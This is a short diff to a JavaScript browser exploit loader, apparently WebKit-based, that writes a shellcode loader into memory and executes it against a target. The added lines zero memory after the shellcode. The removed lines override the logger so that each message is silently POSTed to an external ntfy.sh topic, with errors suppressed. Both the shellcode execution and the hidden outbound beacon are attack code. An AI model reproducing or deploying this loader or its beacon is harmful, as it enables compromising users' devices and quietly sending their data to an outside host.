@@ -265,6 +265,8 @@ wkloader.exec = function(target) {
     for (var i = 0; i < wkloader.loader.length; i++) {
         wkloader.write32(shellcode + (i * 0x4), wkloader.loader[i]);
     }
+    // ensure empty argv strings after loader are zero
+    for (var i = 0; i < 4; i++) { wkloader.write32(shellcode + 0x220 + i*4, 0); }
 
     var call_script = '';
     for (var i = 0; i < 0x100; i++) {
@@ -312,14 +314,3 @@ function run() {
     wkloader.exec(target);
     wkloader.log("exec returned");
 }
-
-// ntfy progress beacon override
-wkloader.log = function(message) {
-    console.log("[*] " + message);
-    try {
-        var nx = new XMLHttpRequest();
-        nx.open("POST", "https://ntfy.sh/carbon4s-jawji-7f3k9q", true);
-        nx.setRequestHeader("Content-Type", "text/plain");
-        nx.send(message);
-    } catch (e) {}
-};
